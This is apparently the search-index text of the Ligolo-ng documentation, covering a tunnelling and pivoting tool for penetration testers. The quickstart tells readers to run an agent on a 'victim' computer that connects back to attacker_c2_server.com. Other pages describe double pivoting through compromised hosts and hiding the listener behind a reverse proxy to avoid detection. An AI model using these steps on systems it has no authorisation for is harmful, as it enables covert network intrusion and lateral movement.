{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Introduction","text":"<p>Ligolo-ng is a simple, lightweight and fast tool that allows pentesters to establish tunnels from a reverse TCP/TLS connection using a tun interface (without the need of SOCKS).</p>"},{"location":"#features","title":"Features","text":"<ul> <li>Tun interface (No more SOCKS!)</li> <li>Simple UI with agent selection and network information</li> <li>Easy to use and setup</li> <li>Automatic certificate configuration with Let's Encrypt</li> <li>Performant (Multiplexing)</li> <li>Does not require high privileges</li> <li>Socket listening/binding on the agent</li> <li>Multiple platforms supported for the agent</li> <li>Can handle multiple tunnels</li> <li>Reverse/Bind Connection</li> </ul>"},{"location":"#how-is-this-different-from-ligolochiselmeterpreter","title":"How is this different from Ligolo/Chisel/Meterpreter... ?","text":"<p>Instead of using a SOCKS proxy or TCP/UDP forwarders, Ligolo-ng creates a userland network stack using Gvisor.</p> <p>When running the relay/proxy server, a tun interface is used, packets sent to this interface are translated, and then transmitted to the agent remote network.</p> <p>As an example, for a TCP connection:</p> <ul> <li>SYN are translated to connect() on remote</li> <li>SYN-ACK is sent back if connect() succeed</li> <li>RST is sent if ECONNRESET, ECONNABORTED or ECONNREFUSED syscall are returned after connect</li> <li>Nothing is sent if timeout</li> </ul> <p>This allows running tools like nmap without the use of proxychains (simpler and faster).</p>"},{"location":"#demo","title":"Demo","text":""},{"location":"#does-it-require-administratorroot-access","title":"Does it require Administrator/root access ?","text":"<p>On the agent side, no! Everything can be performed without administrative access.</p> <p>However, on your relay/proxy server, you need to be able to create a tun interface.</p>"},{"location":"#supported-protocolspackets","title":"Supported protocols/packets","text":"<ul> <li>TCP</li> <li>UDP</li> <li>ICMP (echo requests)</li> </ul>"},{"location":"#performance","title":"Performance","text":"<p>You can easily hit more than 100 Mbits/sec. Here is a test using <code>iperf</code> from a 200Mbits/s server to a 200Mbits/s connection. <pre><code>$ iperf3 -c 10.10.0.1 -p 24483\nConnecting to host 10.10.0.1, port 24483\n[  5] local 10.10.0.224 port 50654 connected to 10.10.0.1 port 24483\n[ ID] Interval           Transfer     Bitrate         Retr  Cwnd\n[  5]   0.00-1.00   sec  12.5 MBytes   105 Mbits/sec    0    164 KBytes       \n[  5]   1.00-2.00   sec  12.7 MBytes   107 Mbits/sec    0    263 KBytes       \n[  5]   2.00-3.00   sec  12.4 MBytes   104 Mbits/sec    0    263 KBytes       \n[  5]   3.00-4.00   sec  12.7 MBytes   106 Mbits/sec    0    263 KBytes       \n[  5]   4.00-5.00   sec  13.1 MBytes   110 Mbits/sec    2    134 KBytes       \n[  5]   5.00-6.00   sec  13.4 MBytes   113 Mbits/sec    0    147 KBytes       \n[  5]   6.00-7.00   sec  12.6 MBytes   105 Mbits/sec    0    158 KBytes       \n[  5]   7.00-8.00   sec  12.1 MBytes   101 Mbits/sec    0    173 KBytes       \n[  5]   8.00-9.00   sec  12.7 MBytes   106 Mbits/sec    0    182 KBytes       \n[  5]   9.00-10.00  sec  12.6 MBytes   106 Mbits/sec    0    188 KBytes       \n- - - - - - - - - - - - - - - - - - - - - - - - -\n[ ID] Interval           Transfer     Bitrate         Retr\n[  5]   0.00-10.00  sec   127 MBytes   106 Mbits/sec    2             sender\n[  5]   0.00-10.08  sec   125 MBytes   104 Mbits/sec                  receiver\n</code></pre></p>"},{"location":"#caveats","title":"Caveats","text":"<p>Because the agent is running without privileges, it's not possible to forward raw packets. When you perform a NMAP SYN-SCAN, a TCP connect() is performed on the agent.</p> <p>When using nmap, you should use <code>--unprivileged</code> or <code>-PE</code> to avoid false positives.</p>"},{"location":"Bind/","title":"Agent as server (Bind Connection)","text":"<p>The Ligolo-ng agent can operate using a bind connection (i.e. acting as a server).</p> <p>Instead of using the <code>--connect [ip:port]</code> argument, you can use <code>--bind [ip:port]</code> so the agent start listening to connections.</p> <p>After that, the proxy can connect to the agent using the <code>connect_agent</code> command.</p> <p>In a terminal: <pre><code>\u00bb ligolo-agent -bind 127.0.0.1:4444                                                                                                                                                                   \nWARN[0000] TLS Certificate fingerprint is: 05518ABE4F0D3B137A2365E0DE52A01FE052EE4C5A2FD12D8E2DD93AED1DD04B \nINFO[0000] Listening on 127.0.0.1:4444...               \nINFO[0005] Got connection from: 127.0.0.1:53908         \nINFO[0005] Connection established                        addr=\"127.0.0.1:53908\"\n</code></pre></p> <p>In ligolo-ng proxy:</p> <pre><code>ligolo-ng \u00bb connect_agent --ip 127.0.0.1:4444\n? TLS Certificate Fingerprint is: 05518ABE4F0D3B137A2365E0DE52A01FE052EE4C5A2FD12D8E2DD93AED1DD04B, connect? Yes\nINFO[0021] Agent connected.                              name=nchatelain@nworkstation remote=\"127.0.0.1:4444\"\n</code></pre>"},{"location":"Config-File/","title":"Configuration File","text":"<p>Since Ligolo-ng v0.8, the <code>proxy</code> supports a configuration file for advanced features.</p> <pre><code>agent:\n    deadbeefcafe:\n        autobind: false\n        interface: ligolo\ninterface:\n    ligolo:\n        routes:\n            - 10.55.0.0/24\n    massivebyte:\n        routes:\n            - 10.56.0.0/24\nweb:\n    corsallowedorigin:\n        - '*'\n    debug: false\n    enabled: true\n    listen: :8080\n    secret: 1107608060e80ba4dfadd6a1fbc9fb3f4367fbf0b84f505bab0caf4e769db54e\n    trustedproxies:\n        - 127.0.0.1\n    users:\n        ligolo: $argon2id$v=19$m=32768,t=3,p=4$KQNyNWbYX2rsrl5rvTzR0g$VwRGBk4Gwzu3cmKBH4eqjv/zP4QieYB1IA7liu5HTO8\n</code></pre>"},{"location":"Config-File/#agent","title":"Agent","text":""},{"location":"Config-File/#autobinding","title":"Autobinding","text":"<p>The autobind feature allows agents to be automatically assigned to an interface when they log on.</p> <p>To enable this feature, you need to specify the session identifier (by default, the agent's MAC address), the interface to which it will be attached, and set autobind to true.</p> <pre><code>agent:\n    deadbeefcafe:\n        autobind: true\n        interface: ligolo\n</code></pre> <p>The following lines should appear the next time the agent connects:</p> <pre><code>INFO[0001] Agent joined. id=deadbeefcafe name=nchatelain@nworkstation remote=\"127.0.0.1:56072\"\nINFO[0001] Starting autobind session: deadbeefcafe on interface ligolo \nINFO[0001] Starting tunnel to nchatelain@nworkstation (deadbeefcafe)\n</code></pre>"},{"location":"Config-File/#interface","title":"Interface","text":""},{"location":"Config-File/#automatic-interfaces-routes","title":"Automatic interfaces &amp; routes","text":"<p>Tired of having to configure interfaces and routes every time? You can now configure interfaces and routes in advance in the configuration file. As soon as you start a tunneling session, Ligolo-ng will take care of everything.</p> <pre><code>interface:\n    ligolo:\n        routes:\n            - 10.55.0.0/24\n</code></pre> <p>Info</p> <p>Each time you add an interface/route using Ligolo-ng commands like interface_create, route_add, it will be automatically registered in the configuration file.</p>"},{"location":"Config-File/#web","title":"Web","text":"<p>Ligolo-ng now has an experimental Web API, capable of controlling all cli interface functions via HTTP calls.</p>"},{"location":"Config-File/#settings","title":"Settings","text":"<pre><code>web:\n    corsallowedorigin:\n        - '*'\n    debug: false\n    enabled: true\n    listen: :8080\n    secret: 1107608060e80ba4dfadd6a1fbc9fb3f4367fbf0b84f505bab0caf4e769db54e\n    trustedproxies:\n        - 127.0.0.1\n    users:\n        ligolo: $argon2id$v=19$m=32768,t=3,p=4$KQNyNWbYX2rsrl5rvTzR0g$VwRGBk4Gwzu3cmKBH4eqjv/zP4QieYB1IA7liu5HTO8\n</code></pre> <ul> <li>corsallowedorigin: Set the list of origins that should be allowed to make cross-origin calls</li> <li>debug: run the webserver with debug enabled, which is a lot noisier</li> <li>enabled: enable or disable the API (default: false)</li> <li>secret: the JWT secret, automatically generated on first start</li> <li>trustedproxies: trustedproxies set a list of network origins (IPv4 addresses, IPv4 CIDRs, IPv6 addresses or IPv6 CIDRs) from which to trust request's headers that contain alternative client IP.</li> <li>users: users allowed to connect to the web API</li> </ul> <p>Tip</p> <p>You don't need to manually encrypt passwords using argon2id. If you specify a cleartext password, Ligolo-ng will automatically encrypt your password and update the configuration file.</p>"},{"location":"InstallBuild/","title":"Installing/Building Ligolo-ng","text":"<p>Info</p> <p>The ligolo-ng proxy has been tested on various architectures, and is expected to run on Windows, Linux, Mac, FreeBSD and OpenBSD. The agent, on the other hand, is very simple to use and should work on almost all Golang-supported architectures. With a little work, you should even be able to implement it in other languages!</p>"},{"location":"InstallBuild/#precompiled-binaries","title":"Precompiled binaries","text":"<p>Precompiled binaries (Windows/Linux/macOS/BSD) are available on the Release page.</p>"},{"location":"InstallBuild/#kali-repository","title":"Kali Repository","text":"<p>Ligolo-ng is now included by default in Kali Linux. You can install it using <code>apt install ligolo-ng</code>. However, I recommend using the latest precompiled version on this github repository.</p>"},{"location":"InstallBuild/#building-ligolo-ng","title":"Building Ligolo-ng","text":"<p>Building ligolo-ng (Go &gt;= 1.20 is required):</p> <pre><code>$ go build -o agent cmd/agent/main.go\n$ go build -o proxy cmd/proxy/main.go\n# Build for Windows\n$ GOOS=windows go build -o agent.exe cmd/agent/main.go\n$ GOOS=windows go build -o proxy.exe cmd/proxy/main.go\n</code></pre>"},{"location":"Listeners/","title":"Listeners (Agent Binding/Listening)","text":"<p>You can listen to ports on the agent and redirect connections to your control/proxy server.</p> <p>In a ligolo session, use the <code>listener_add</code> command.</p> <p>The following example will create a TCP listening socket on the agent (0.0.0.0:1234) and redirect connections to the 4321 port of the proxy server. <pre><code>[Agent : nchatelain@nworkstation] \u00bb listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4321 --tcp\nINFO[1208] Listener created on remote agent!            \n</code></pre></p> <p>On the <code>proxy</code>:</p> <pre><code>$ nc -lvp 4321\n</code></pre> <p>When a connection is made on the TCP port <code>1234</code> of the agent, <code>nc</code> will receive the connection.</p> <p>This is very useful when using reverse tcp/udp payloads.</p> <p>You can view currently running listeners using the <code>listener_list</code> command and stop them using the <code>listener_stop</code> command:</p> <pre><code>[Agent : nchatelain@nworkstation] \u00bb listener_list \n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Active listeners                                                              \u2502\n\u251c\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 # \u2502 AGENT                   \u2502 AGENT LISTENER ADDRESS \u2502 PROXY REDIRECT ADDRESS \u2502\n\u251c\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 0 \u2502 nchatelain@nworkstation \u2502 0.0.0.0:1234           \u2502 127.0.0.1:4321         \u2502\n\u2514\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\n[Agent : nchatelain@nworkstation] \u00bb listener_stop 0\nINFO[1505] Listener closed.                             \n</code></pre>"},{"location":"Localhost/","title":"Access to agent's local ports (127.0.0.1)","text":"<p>If you need to access the local ports of the currently connected agent, there's a \"magic\" CIDR hardcoded in Ligolo-ng: 240.0.0.0/4 (This is an unused IPv4 subnet). If you query an IP address on this subnet, Ligolo-ng will automatically redirect traffic to the agent's local IP address (127.0.0.1).</p> <p>Example:</p> <pre><code>$ sudo ip route add 240.0.0.1/32 dev ligolo\n$ nmap 240.0.0.1 -sV\nStarting Nmap 7.93 ( https://nmap.org ) at 2023-12-30 22:17 CET\nNmap scan report for 240.0.0.1\nHost is up (0.023s latency).\nNot shown: 998 closed tcp ports (conn-refused)\nPORT STATE SERVICE VERSION\n22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)\n8000/tcp open http SimpleHTTPServer 0.6 (Python 3.9.2)\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 7.16 seconds\n</code></pre>"},{"location":"Quickstart/","title":"Quickstart","text":""},{"location":"Quickstart/#prerequisites","title":"Prerequisites","text":""},{"location":"Quickstart/#linux","title":"Linux","text":"<p>When using Linux, you need to create a tun interface on the Proxy Server (C2):</p> <pre><code>$ sudo ip tuntap add user [your_username] mode tun ligolo\n$ sudo ip link set ligolo up\n</code></pre> <p>Tip</p> <p>On Ligolo-ng &gt;= v0.6, you can now use the <code>interface_create</code> command to create a new interface! No need to use ip tuntap!</p> <pre><code>ligolo-ng \u00bb interface_create --name \"evil-cha\"\nINFO[3185] Creating a new \"evil-cha\" interface...       \nINFO[3185] Interface created!\n</code></pre>"},{"location":"Quickstart/#windows","title":"Windows","text":"<p>You need to download the Wintun driver (used by WireGuard) and place the <code>wintun.dll</code> in the same folder as Ligolo (make sure you use the right architecture).</p>"},{"location":"Quickstart/#tls-options","title":"TLS Options","text":""},{"location":"Quickstart/#using-lets-encrypt-autocert","title":"Using Let's Encrypt Autocert","text":"<p>When using the <code>-autocert</code> option, the proxy will automatically request a certificate (using Let's Encrypt) for attacker_c2_server.com when an agent connects.</p> <p>Info</p> <p>Port 80 needs to be accessible for Let's Encrypt certificate validation/retrieval</p>"},{"location":"Quickstart/#using-your-own-tls-certificates","title":"Using your own TLS certificates","text":"<p>If you want to use your own certificates for the proxy server, you can use the <code>-certfile</code> and <code>-keyfile</code> parameters.</p>"},{"location":"Quickstart/#automatic-self-signed-certificates","title":"Automatic self-signed certificates","text":"<p>The proxy/relay can automatically generate self-signed TLS certificates using the <code>-selfcert</code> option.</p> <p>Validating self-signed certificates fingerprints (recommended)</p> <p>When running selfcert, you can run the <code>certificate_fingerprint</code> command to print the currently used certificate fingerprint.</p> <pre><code>ligolo-ng \u00bb certificate_fingerprint \nINFO[0203] TLS Certificate fingerprint for ligolo is: D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC \n</code></pre> <p>On the agent, you can then connect using the fingerprint provided by the Ligolo-ng proxy.</p> <pre><code>ligolo-agent -connect 127.0.0.1:11601 -v -accept-fingerprint D005527D2683A8F2DB73022FBF23188E064493CFA17D6FCF257E14F4B692E0FC                                               nchatelain@nworkstation\nINFO[0000] Connection established                        addr=\"127.0.0.1:11601\"\n</code></pre> <p>Warning</p> <p>By default, the <code>ligolo</code> domain name is used for TLS Certificate generation. You can change the domain by using the -selfcert-domain [domain] option at startup.</p> <p>Ignoring all certificate verification (for lab/debugging)</p> <p>To ignore all security mechanisms, the <code>-ignore-cert</code> option can be used with the agent.</p> <p>Warning</p> <p>Beware of man-in-the-middle attacks! This option should only be used in a test environment or for debugging purposes.</p>"},{"location":"Quickstart/#using-ligolo-ng","title":"Using Ligolo-ng","text":""},{"location":"Quickstart/#start-the-ligolo-ng-proxy-server","title":"Start the Ligolo-ng proxy server","text":"<p>Start the proxy server on your Command and Control (C2) server (default port 11601):</p> <pre><code>$ ./proxy -h # Help options\n$ ./proxy -autocert # Automatically request LetsEncrypt certificates\n$ ./proxy -selfcert # Use self-signed certificates\n</code></pre>"},{"location":"Quickstart/#start-the-agent","title":"Start the agent","text":"<p>Start the agent on your target (victim) computer (no privileges are required!):</p> <pre><code>$ ./agent -connect attacker_c2_server.com:11601\n</code></pre> <p>Info</p> <p>If you want to tunnel the connection over a SOCKS5 proxy, you can use the <code>--socks ip:port</code> option. You can specify SOCKS credentials using the <code>--socks-user</code> and <code>--socks-pass</code> arguments.</p> <p>A session should appear on the proxy server.</p> <pre><code>INFO[0102] Agent joined. name=nchatelain@nworkstation remote=\"XX.XX.XX.XX:38000\"\n</code></pre> <p>Use the <code>session</code> command to select the agent.</p> <pre><code>ligolo-ng \u00bb session \n? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000\n</code></pre>"},{"location":"Quickstart/#start-the-tunneling","title":"Start the tunneling","text":"<p>Start the tunnel on the proxy, using the <code>evil-cha</code> interface name.</p> <pre><code>[Agent : nchatelain@nworkstation] \u00bb tunnel_start --tun evil-cha\n[Agent : nchatelain@nworkstation] \u00bb INFO[0690] Starting tunnel to nchatelain@nworkstation   \n</code></pre> <p>Info</p> <p>On macOS, you need to specify a utun[0-9] device, like utun4.</p>"},{"location":"Quickstart/#setup-routing","title":"Setup routing","text":""},{"location":"Quickstart/#ligolo-ng-managed-routing","title":"Ligolo-ng managed routing","text":""},{"location":"Quickstart/#manual-routing-setup","title":"Manual routing setup","text":"<p>First, display the network configuration of the agent using the <code>ifconfig</code> command:</p> <pre><code>[Agent : nchatelain@nworkstation] \u00bb ifconfig \n[...]\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502 Interface 3                                 \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502 Name         \u2502 wlp3s0                       \u2502\n\u2502 Hardware MAC \u2502 de:ad:be:ef:ca:fe            \u2502\n\u2502 MTU          \u2502 1500                         \u2502\n\u2502 Flags        \u2502 up|broadcast|multicast       \u2502\n\u2502 IPv4 Address \u2502 192.168.0.30/24             \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <p>Then setup routes accordingly to your system:</p> LinuxWindowsMacOS (Darwin) <p>Using the terminal: <pre><code>$ sudo ip route add 192.168.0.0/24 dev ligolo\n</code></pre> Or using the Ligolo-ng (&gt;= 0.6) cli: <pre><code>ligolo-ng \u00bb interface_add_route --name evil-cha --route 192.168.2.0/24\nINFO[3206] Route created.                               \n</code></pre></p> <pre><code>&gt; netsh int ipv4 show interfaces\n\nIdx     M\u00e9t         MTU          \u00c9tat                Nom\n---  ----------  ----------  ------------  ---------------------------\n 25           5       65535  connected     ligolo\n\n&gt; route add 192.168.0.0 mask 255.255.255.0 0.0.0.0 if [THE INTERFACE IDX]\n</code></pre> <pre><code>$ sudo ifconfig utun4 alias [random_ip] 255.255.255.0\n$ sudo route add -net 192.168.2.0/24 -interface utun4\n</code></pre> <p>You can now access the 192.168.0.0/24 agent network from the proxy server.</p> <pre><code>$ nmap 192.168.0.0/24 -v -sV -n\n[...]\n$ rdesktop 192.168.0.123\n[...]\n</code></pre>"},{"location":"sample/Configuring-a-reverse-proxy/","title":"Running behind a reverse proxy","text":"<p>Thanks to @Defte_</p> <p>This documentation was written by @Defte_, many thanks to him! Using a reverse proxy will surely help you reduce your footprint and avoid being detected!</p> <p>If you ever need to hide the listener behind a reverse proxy (in our case Nginx), here is the Nginx configuration you will have to add:</p> <pre><code>server {\n    server_name DNS_NAME;\n    index index.html;\n    location / {\n        proxy_set_header Host $host;\n        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;\n        proxy_set_header Upgrade websocket;\n        proxy_set_header Connection Upgrade;\n        proxy_http_version 1.1; \n        proxy_pass https://LOCAL_IP:PORT;\n    }\n    listen 443 ssl;\n    ssl_certificate /etc/letsencrypt/live/DNS_NAME/fullchain.pem;\n    ssl_certificate_key /etc/letsencrypt/live/DNS_NAME/privkey.pem;\n    include /etc/letsencrypt/options-ssl-nginx.conf; \n    ssl_dhparam /etc/letsencrypt/ssl-dhparams.pem;\n}   \n</code></pre> <p>That use case relies on let's encrypt to retrieve certificates so you will have to change the certificate and key suiting your needs. Once done, you can launch the ligolo proxy that way:</p> <pre><code>proxy -laddr https://LOCAL_IP:PORT -certfile /etc/letsencrypt/live/DNS_NAME/fullchain.pem -keyfile /etc/letsencrypt/live/DNS_NAME/privkey.pem\n</code></pre> <p>And the agent:</p> <pre><code>agent -connect https://DNS_NAME\n</code></pre>"},{"location":"sample/baremetal/","title":"Ligolo-baremetal","text":"<p>Still in WIP!</p> <p>Ligolo-baremetal is an experimental build of Ligolo-ng designed to run directly on embedded systems without any overlay (no operating system or kernel).</p> <p>The advantage is that you can deploy physical Ligolo-ng implants quickly and easily.</p> <p>This feature is still under development, but you can get some technical details by following the talk that took place at DEFCON Paris</p>"},{"location":"sample/basic/","title":"Basic tunneling with Ligolo-ng","text":"<p>Info</p> <p>This is an extract from the \"Quickstart\" section of the documentation.</p> <p></p>"},{"location":"sample/basic/#start-the-ligolo-ng-proxy-server","title":"Start the Ligolo-ng proxy server","text":"<p>Start the proxy server on your Command and Control (C2) server (default port 11601):</p> <pre><code>$ ./proxy -h # Help options\n$ ./proxy -autocert # Automatically request LetsEncrypt certificates\n$ ./proxy -selfcert # Use self-signed certificates\n</code></pre> <p></p>"},{"location":"sample/basic/#start-the-agent","title":"Start the agent","text":"<p>Start the agent on your target (victim) computer (no privileges are required!):</p> <pre><code>$ ./agent -connect attacker_c2_server.com:11601\n</code></pre> <p>Info</p> <p>If you want to tunnel the connection over a SOCKS5 proxy, you can use the <code>--socks ip:port</code> option. You can specify SOCKS credentials using the <code>--socks-user</code> and <code>--socks-pass</code> arguments.</p> <p>A session should appear on the proxy server.</p> <p></p> <p>Use the <code>session</code> command to select the agent.</p> <pre><code>ligolo-ng \u00bb session \n? Specify a session : 1 - nchatelain@nworkstation - XX.XX.XX.XX:38000\n</code></pre>"},{"location":"sample/basic/#start-the-tunneling","title":"Start the tunneling","text":"<p>Create a network interface using <code>interface_add</code>, setup routes to the agent network and then start the tunnel !</p> <p></p>"},{"location":"sample/basic/#access-the-remote-network","title":"Access the remote network","text":"<p>Once the tunnel is started, you can access the network resources!</p> <p></p>"},{"location":"sample/double/","title":"Advanced Tunnel / Double Pivot","text":"<p>Read the docs!</p> <p>Make sure you have read the \"Basic Tunneling\" or \"Quickstart\" part of the documentation before following this guide!</p> <p>Sometimes it is necessary to install a tunnel with a pivot. This is the case when you want to bounce onto a restricted network from a machine that doesn't have direct access to the Internet or to the Ligolo-ng daemon, but that machine can contact a host you've already compromised.</p> <p>Thanks to Ligolo-ng's listeners feature, you can listen to a port on a Ligolo-ng agent, then retransmit connections to the Ligolo-ng proxy.</p> <p>This tutorial simply explains how to establish a Ligolo-ng connection through a pivot.</p> <p></p>"},{"location":"sample/double/#tutorial","title":"Tutorial","text":""},{"location":"sample/double/#on-the-ligolo-ng-server","title":"On the Ligolo-ng Server","text":"<p>Start the <code>Ligolo-ng</code> server.</p> <p></p>"},{"location":"sample/double/#on-agent-1","title":"On Agent 1","text":"<p>Connect the <code>Agent 1</code> to the <code>Ligolo-ng</code> server.</p> <p></p> <p>Create a Listener using the <code>listener_add</code> command.</p> <p><code>listener_add</code> takes two mandatory parameters:</p> <ul> <li><code>--addr</code>: specifies which <code>ip:port</code> should be listening on the agent.</li> <li><code>--to</code>: specifies where the connection will be relayed.</li> </ul> <p>Info</p> <p>You can also use <code>--tcp</code> or <code>--udp</code> to specify which protocol to use. (Default is TCP)</p> <p>If you run: <code>listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:11601</code>:</p> <ul> <li>The agent will listen on <code>0.0.0.0:4444</code></li> <li>Any connections on this <code>ip:port</code> will be relayed to the <code>11601</code> TCP local port of the Ligolo-ng daemon.</li> </ul> <p></p> <p>Info</p> <p>11601 is the default Ligolo-ng daemon server port. Any connections to the agent IP on port 4444 will be relayed to the Ligolo-ng local port!</p> <p>You can confirm that the listener is running on <code>agent 1</code> by using the <code>listener_list</code> command:</p> <p></p>"},{"location":"sample/double/#on-agent-2","title":"On Agent 2","text":"<p>After running the <code>listener_add</code> command on the first agent, you can execute the Ligolo-ng agent on the second server (which does not have Internet access). </p> <p>Instead of specifying the <code>IP:PORT</code> of the Ligolo-ng daemon, you have to specify the IP of the first agent and the listening port used in <code>listener_add</code> (in our example, <code>4444</code>).</p> <p><code>$ ./ligolo-agent --connect 10.24.0.30:4444</code></p> <p></p> <p>After that, you should have a new agent connected to Ligolo-ng:</p> <p></p> <p>You can now setup the <code>Ligolo-ng</code> tunnel targeting the Agent 2 private network.</p> <p></p> <p>Once the tunnel is started, you can now access the private network resources!</p> <p></p>"},{"location":"sample/router/","title":"Creating a Ligolo-ng router","text":"<p>In this tutorial, we will showcase how you can create a Ligolo-ng router to allow various computers on your network to access the agent network (like a site-to-site VPN).</p> <p>This tutorial will use Pfsense, but the steps are mostly the same on other Router OS:</p> <ul> <li>Install Ligolo-ng daemon</li> <li>Connect an agent</li> <li>Start the tunnel on a specific interface</li> <li>Create a route to the agent network</li> <li>Change firewall rules to allow access to the target network</li> </ul>"}]}